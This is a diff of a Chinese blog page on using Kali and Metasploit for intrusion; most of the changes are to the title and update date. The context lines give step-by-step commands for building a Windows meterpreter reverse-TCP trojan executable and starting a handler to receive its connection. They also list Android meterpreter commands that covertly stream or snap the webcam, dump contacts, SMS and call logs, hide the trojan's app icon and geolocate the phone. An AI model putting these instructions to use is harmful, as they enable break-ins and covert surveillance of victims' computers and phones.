@@ -20,7 +20,7 @@
   <meta name="author" content="DragonOne">
   <meta name="keywords" content="">
   
-  <title>Kali-MSF入侵电脑 - 墨水的记忆</title>
+  <title>Kali-MSF入侵 - 墨水的记忆</title>
 
   <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css" />
 
@@ -154,7 +154,7 @@
       <div class="full-bg-img">
         <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
           <div class="page-header text-center fade-in-up">
-            <span class="h2" id="subtitle" title="Kali-MSF入侵电脑">
+            <span class="h2" id="subtitle" title="Kali-MSF入侵">
               
             </span>
 
@@ -234,11 +234,11 @@ color="220,220,220" opacity='0.7' zIndex="-2" count="200" src="//cdn.bootcss.com
         <div class="py-5" id="board">
           <article class="post-content mx-auto">
             <!-- SEO header -->
-            <h1 style="display: none">Kali-MSF入侵电脑</h1>
+            <h1 style="display: none">Kali-MSF入侵</h1>
             
               <p class="note note-info">
                 
-                  本文最后更新于：April 11, 2021 pm
+                  本文最后更新于：May 5, 2021 am
                 
               </p>
             
@@ -261,22 +261,7 @@ color="220,220,220" opacity='0.7' zIndex="-2" count="200" src="//cdn.bootcss.com
 <hr>
 <h2 id="第二种用法"><a href="#第二种用法" class="headerlink" title="第二种用法"></a>第二种用法</h2><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-number">1.</span><br>msfpayload windows/meterpreter/reverse_tcp LHOST=本机IP LPORT=<span class="hljs-number">4444</span>端口 x &gt; /root/Desktop/<span class="hljs-number">1.</span>exe<br>这样就会在桌面生成<span class="hljs-number">1.</span>exe 也就是我们的木马<br><span class="hljs-number">2.</span><br>输入msfconsole 进入msf<br><span class="hljs-number">3.</span><br>依次输入以下命令 <br>use exploit/multi/handler<br><span class="hljs-built_in">set</span> PAYLOAD windows/meterpreter/reverse_top<br><span class="hljs-built_in">set</span> LHOST 本机Ip<br><span class="hljs-comment">//set lport 端口号</span><br>exploit<br>等到windows运行了<span class="hljs-number">1.</span>exe后 就Ok<br><span class="hljs-number">4.</span><br>meterpreter的命令直接-h 看帮助<br></code></pre></div></td></tr></table></figure>
 
-<h1 id="MSF入侵Android"><a href="#MSF入侵Android" class="headerlink" title="MSF入侵Android"></a>MSF入侵Android</h1><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-number">1.</span>开启摄像头<br>  webcam_stream<br><span class="hljs-number">2.</span>导出手机号码<br>  dump_contacts<br><span class="hljs-number">3.</span>导出短信<br>  dump_sms<br><span class="hljs-number">4.</span>通过摄像头拍照功能<br>  webcam_snap<br><span class="hljs-number">5.</span>从目标会话发送短消息<br>  send_sms<br><span class="hljs-number">6.</span>隐秘拍照功能<br>  webcam_snap<br><span class="hljs-number">7.</span>从指定的摄像头获取快照<br>  webcam_snap<br><span class="hljs-number">8.</span>检查设备是否有根<br>  check_root<br><span class="hljs-number">9.</span>隐藏手机端木马程序图标<br>  hide_app_icon<br><span class="hljs-number">10.</span>获取通话记录<br>  dump_calllog<br><span class="hljs-number">11.</span>获取手机的当前的经纬度<br>  geolocate<br><br><br><br><br></code></pre></div></td></tr></table></figure>
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
+<h1 id="MSF入侵Android"><a href="#MSF入侵Android" class="headerlink" title="MSF入侵Android"></a>MSF入侵Android</h1><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-number">1.</span>开启摄像头<br>  webcam_stream<br><span class="hljs-number">2.</span>导出手机号码<br>  dump_contacts<br><span class="hljs-number">3.</span>导出短信<br>  dump_sms<br><span class="hljs-number">4.</span>通过摄像头拍照功能<br>  webcam_snap<br><span class="hljs-number">5.</span>从目标会话发送短消息<br>  send_sms<br><span class="hljs-number">6.</span>隐秘拍照功能<br>  webcam_snap<br><span class="hljs-number">7.</span>从指定的摄像头获取快照<br>  webcam_snap<br><span class="hljs-number">8.</span>检查设备是否有根<br>  check_root<br><span class="hljs-number">9.</span>隐藏手机端木马程序图标<br>  hide_app_icon<br><span class="hljs-number">10.</span>获取通话记录<br>  dump_calllog<br><span class="hljs-number">11.</span>获取手机的当前的经纬度<br>  geolocate<br><br></code></pre></div></td></tr></table></figure>
 
 
             </div>
